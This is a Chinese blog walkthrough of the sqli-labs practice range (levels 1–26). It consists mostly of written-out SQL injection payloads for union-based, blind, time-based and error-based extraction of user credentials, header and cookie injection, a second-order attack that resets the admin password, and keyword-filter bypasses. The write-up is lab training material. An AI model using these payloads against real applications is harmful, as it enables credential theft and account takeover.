---
title: "Sql Labs靶场 [更新中]"
date: 2024-04-14T22:48:59+08:00
categories: ["靶场"]
image: https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202406270744823.gif
draft: true
---

## 前言

之前总是打了几关就摆了，这次一定打完。

## sql注入基础

## less - 1

![image-20240521110201592](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211102977.png)

1. 先找注入点，题上已经给了提示，所以注入点就是`?id=`

2. 然后确认是数字类型还是字符类型

```sql
?id=1		------		无报错        
?id=1 --+	------		无报错
?id=1'		------		报错
?id=1' --+	------		无报错
```

![image-20240521110938758](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211109166.png)

所以可以确定是字符类型

3. 确认列数

```sql
?id=1' order by 3		------		正常回显
?id=1' order by 4		------		超出列数
or
?id=1' union select 1,2,3,4 ... 
```

![image-20240521111227528](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211112842.png)

所以可以确定列数为`3`

4. 联合注入

   先查出显示位

```sql
?id=-1' union select 1,2,3--+
```

![image-20240521113202325](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211132875.png)

可以知道显示位在`2，3`位置。这里用`-1`是为了不让sql语句查询到数据，因为`id=-1`是没有数据的，所以才会把`select`执行的语句显示出来。

最后就可以爆数据了

```sql
?id=-1' union select 1,database(),version()--+
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1' union select 1,2,group_concat(username ,id , password) from users--+
```

## less - 2

![image-20240521174005926](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211740465.png)

先判断是字符型还是数字型

```sql
?id=1		------		正常
?id=1 and 1=1	------		正常
?id=1 adn 1=2	------		错误
```

![image-20240521174919070](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211749462.png)

可以确定是数字型，后面的步骤就和`less-1`基本一致了

```sql
?id=-1 union select 1,database(),version()--+
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1 union select 1,2,group_concat(username ,id , password) from users--+
```

## less - 3

先判断类型

```sql
?id=1		------		正常
?id=1'		------		报错
```

这里报错显示如下

![image-20240521182425354](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211824896.png)

可以发现和`less-1`的报错信息很像，但是报错信息中多了`)`，所以在这关中闭合符号不是`'`而是`')`

```sql
?id=1')			------		报错
?id=1')--+		------		正常
```

接着进行注入

```sql
?id=-1') union select 1,database(),version()--+
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1') union select 1,2,group_concat(username ,id , password) from users--+
```

## less - 4

还是判断闭合符，这里是通过审计源代码才知道闭合符为`")`

```sql
?id=1")		------			报错
```

![image-20240521183124352](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211831781.png)

```sql
?id=-1") union select 1,database(),version()--+
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1") union select 1,2,group_concat(username ,id , password) from users--+
```

## less - 5

经过测试可以判断是字符类型且闭合符为`'`，但是在这关中正常显示的时候只会显示一个页面。

![image-20240521183557677](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211835036.png)

也就是说我们无法让它显示数据库信息。不过因为只要语句执行正确，它就会显示该页面，所以我们可以构造判断语句，来测出它的数据信息。这就是布尔盲注。

```sql
?id=1'and length((select database()))>9--+
#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4
?id=1'and ascii(substr((select database()),1,1))=115--+
#substr("78909",1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。
 
 
?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13--+
判断所有表名字符长度。
?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+
逐一判断表名
 
?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20--+
判断所有字段名的长度
?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99--+
逐一判断字段名。
 
 
?id=1' and length((select group_concat(username,password) from users))>109--+
判断字段内容长度
?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))>50--+
逐一检测内容。
```

然后可以根据这些sql语句来编写盲注脚本

```python

```

## less - 6

闭合符为`"`，方法同`less-5`

## less - 7

闭合符为`'))`，方法同`less-5`

## less - 8

闭合符为`'`，这关除了不会显示报错信息以外，方法同`less-5`

## less - 9

这关无论输入什么页面显示的内容都是一样的，所以布尔盲注就用不了了，但是它依然可以执行我们插入的sql语句。因此在页面不变的时候，我们可以使用时间盲注，就是但判断为真时，让页面过几秒再渲染，这里就需要使用`sleep()`函数。

```sql
?id=1' and if(1=1,sleep(5),1)--+
判断参数构造。
?id=1'and if(length((select database()))>9,sleep(5),1)--+
判断数据库名长度
 
?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
逐一判断数据库字符
?id=1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
判断所有表名长度
 
?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
逐一判断表名
?id=1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20,sleep(5),1)--+
判断所有字段名的长度
 
?id=1'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
逐一判断字段名。
?id=1' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+
判断字段内容长度
 
 
 
?id=1' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
逐一检测内容。
```

和布尔盲注一样，需要花费很多时间去一点一点尝试，所以可以构造一个脚本进行测试。

```python

```

## less - 10

闭合符为`"`，方法同`less-9`

## less - 11

这关的页面就和之前的不同了，是一个登录界面。

![image-20240523224806655](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405232248969.png)

在之前注入都是通过`get`方法进行传参的，这关中则是`post`传参，可以猜测这里`username`和`password`都是注入点，所以先测试一下，让其报出错误信息。

![image-20240523224637626](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405232246220.png)

根据报错语句，我们可以直接在`username`栏中进行注入。由于这里是`post`方法，所以注释符需要使用`#`或者`--`后面加上空格符。这里注释符的不同和传参方式有关。

接着进行联合注入

```sql
username = 1' union select 1,2# & password = 
```

![image-20240523225640758](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405232256317.png)

后面方法同之前一样。

## less - 12

闭合符为`")`方法同`less-11`

## less - 13

闭合符为`')`，但是这关只显示登录成功或失败，所以这关考点是布尔盲注。

```sql
1') or length((select database()))>9#
```

这里需要使用`or`，因为登录账号是错误的，所以需要由后面的判断来决定这段语句的`true or false`

## less - 14

闭合符为`"`，方法同`less-13`

## less - 15

闭合符为`'`，方法同`less-13`

## less - 16

闭合符为`")`，方法同`less-13`

## less - 17

这关又有新的东西了，先看部分源代码

```php
function check_input($value)           // $value是 username 中的内容
	{
	if(!empty($value))
		{
		// truncation (see comments)
		$value = substr($value,0,15);	//限制传入字符数
		}

		// Stripslashes if magic quotes enabled
		if (get_magic_quotes_gpc())		// 检测该函数是否开启
			{
			$value = stripslashes($value);		//删除字符串中的 /
			}

		// Quote if not a number
		if (!ctype_digit($value))			// 检测传入的字符是否都是数字
			{
			$value = "'" . mysql_real_escape_string($value) . "'";
			}
		
	else
		{
		$value = intval($value);
		}
	return $value;
	}
```

![image-20240524122910082](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405241229558.png)

这里需要用到的就是报错注入。报错注入一般使用这三个函数`extractvalue()`、`updatexml()`、`group by()`。

### extractvalue

`extractvalue(XML_document, Path_string)`

第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc

第二个参数：XPath_string（XPath格式的字符串）

原理：extractvalue(xml_frag, xpath_expr) 函数接收两个参数，一个是XML文档片段，另一个是XPath表达式。正常情况下，这个函数会根据给定的XPath路径从XML文档中提取数据。然而，当XPath表达式构造不当，例如包含了非法字符或者尝试执行一个无法解析为有效XPath表达式的字符串时，函数会抛出错误，并且错误信息可能包含有关查询的信息，这便为报错注入提供了机会。攻击者可以通过精心构造的XPath表达式来触发错误，进而获取数据库敏感信息。

```sql
1' and (extractvalue(1,concat(0x5c,version(),0x5c)))#    爆版本
1' and (extractvalue(1,concat(0x5c,database(),0x5c)))#   爆数据库
 
1' and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))#   爆表名
1' and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x5c)))# 
 爆字段名
 
1' and (extractvalue(1,concat(0x5c,(select password from (select password from users where username='admin1') b) ,0x5c)))#      爆字段内容该格式针对mysql数据库。
1' and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      爆字段内容。
```

这个页面是修改密码页面，所以在`username`栏中需要输入正确的账号，注入点在`password`中

![image-20240524231234797](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405242312298.png)

### updatexml

`updatexml(XML_document, XPath_string, new_value)`

第一个参数：XML_document是String格式，为XML文档对象的名称。

第二个参数：XPath_string(XPath格式的字符串)

第三个参数：new_value, String格式，替换查找到的符合条件的数据

原理：它试图根据XPath表达式定位到XML文档中的某个节点并用new_value替换该节点的内容。如果XPath表达式被设计成无法解析或指向无效位置，那么这个函数也会产生错误。通过控制XPath字符串内容，攻击者能够引起特定类型的错误，这些错误消息中可能携带了关于数据库表结构或数据的信息。

```sql
123' and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本
123' and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库
123' and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名
123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1))#	爆字段名
 
123' and (updatexml(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c),1))#
爆密码该格式针对mysql数据库。
爆其他表就可以，下面是爆emails表
123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='emails'),0x5c),1))#
 
1' and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。
```

![image-20240524231815166](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405242318676.png)

### group by

```sql
123' and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
123' and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      爆数据库版本
1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#        爆出所有表
1' and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e,floor(rand(0)*2)))#    爆出所有字段名
1' and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    爆出所有字段名
1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username='admin1'),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。
```

![image-20240524232119939](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405242321444.png)

## less - 18

这关也使用报错注入，但是注入点不同，查看源代码

![image-20240525151226512](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251512795.png)

发现注入点在`user-agent`字段，这时就需要使用`burpsuite`工具进行抓包，然后在`user-agent`请求头进行注入。

不过这里需要注意两点，首先我们的账号密码需要输入正确，因为根据代码逻辑只有正常登录才会显示`user-agent`的信息。第二就是需要根据编写好的`sql`语句进行闭合，才能注入成功。

![image-20240525152843627](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251528146.png)

之后就可以使用`less-17`报错注入的方法了

## less - 19

这里的注入点变成了`referer`请求头，写法如下

```sql
referer: 1',2)#
```

方法同`less-18`

## less - 20

这关注入点在`cookie`字段

这里需要先正常登录，然后进入登录界面

![image-20240525153624891](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251536259.png)

接着重新刷新该页面，并抓包

![image-20240525154005176](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251540578.png)

方法同`less-17`

## less - 21

源代码中

```php
$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
```

所以这里闭合符为`')`,注入点依然是`cookie`字段，不同点在于这关注入语句需要进行`base64编码`

![image-20240525154825671](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251548942.png)

## less - 22

闭合符为`"`，方法同`less-21`

## less - 23

![image-20240527124928160](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271249369.png)

这关中注释符被过滤了。但是并不妨碍我们进行注入，我们使用注释符只是为了在拼接语句时，将后面一些没用的语句去除。现在不允许使用注释符，我们只要按照它的逻辑进行拼接就行。

```sql
?id=1' or '1'='1
在拼接中就会变为:
?id=1' or '1'='1'
```

所以可以理解为现在`or '1'='1`变成了我们的注释符，接着使用联合注入的方法

```sql

?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1
?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' ),3 or '1'='1
?id=-1' union select 1,(select group_concat(password,username) from users),3 or '1'='1
```

## less - 24

![image-20240527130908228](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271309455.png)

这关的页面组成就比较复杂了，有注册页面、登录页面、修改密码页面，而这些相应的文件我们都要使用到。

先来讲讲这关注入的逻辑，以及文件之间的联动。

`login_register.php`

![image-20240527131742154](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271317335.png)

这个文件掌管注册功能，可以看见这里对注册的账号密码没有任何管控，也就是说你输入什么信息都可以，那我们这里以`username=admin'#    password=123456`信息来注册，注册成功。

接着我们就用这个信息来登录，下面是登录后的界面

![image-20240527132652112](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271326457.png)

`pass_change.php`

![image-20240527132802354](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271328431.png)

这个是修改密码的文件，现在我们用现在登录后的信息拼接到更新密码的sql语句中就会变成

```sql
UPDATE users SET PASSWORD='$pass' where username='admin'# and password='123456' 
```

可以发现我们这里修改的账号就会变成`admin`,这就是`二次注入`的原理。原来`admin`密码是`admin`，现在我们就可以把它的密码修改为我们知道的密码`123456`

![image-20240527133239037](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271332213.png)

可以看到我们成功修改了`admin`的密码，之后就可以用它的权限登录。

## less - 25

![image-20240527134451043](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271344216.png)

这关将`or`和`and`替换为空并且无论大小写，但是它只替换了一次，所以我们可以双写绕过，如果注入语句中含有`or`，我们可以将其写为`oorr`，这样即使替换为空，依然得到`or`

```sql
?id=-2' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'--+
```

## less - 25a

变成了数字型，方法同上

```sql
?id=-2 union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'--+
```

## less - 26

![image-20240530004250965](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405300042352.png)

添加了新的规则，所以现在不能使用逻辑运算符、注释符以及空格符。这次就需要进行绕过。

```
绕过空格
%09 tab键 %0a 新建一行 %0c 新的一页 %od return功能 %0b tab键垂直 %a0 空格   

绕过AND
&&  %26%26

绕过or
||  %7C%7C
```

只要如此绕过，接下来就可以正常注入。不过可能本地建的apache服务没有解析功能，所以还得用`()`方法绕过。

```sql
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))||'0   爆表
 
 
 
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security'aandnd(table_name='users')))),1))||'0     爆字段
 
 
 
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||'0   爆密码账户
```



## 总结

### get传参和post传参注释符使用的不同



